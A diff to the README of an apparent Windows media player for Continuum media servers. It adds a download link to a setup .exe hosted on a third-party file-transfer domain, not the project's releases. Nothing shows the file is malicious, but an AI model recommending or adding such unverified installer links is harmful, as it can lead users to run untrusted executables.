@@ -2,6 +2,10 @@
 
 Native Windows 11 media player for Continuum media servers. Built for direct playback of HEVC/HDR content without server-side transcoding.
 
+## Download
+
+[**Download Installer**](https://transfers.taverncdn.com/CkFuElf0Eu/ContinuumDesktopPlayer-Setup.exe) -- Single-file setup, includes all dependencies. Windows 10/11 x64.
+
 ## Tech Stack
 
 - **Framework:** WinUI 3 / .NET 8 / Windows App SDK
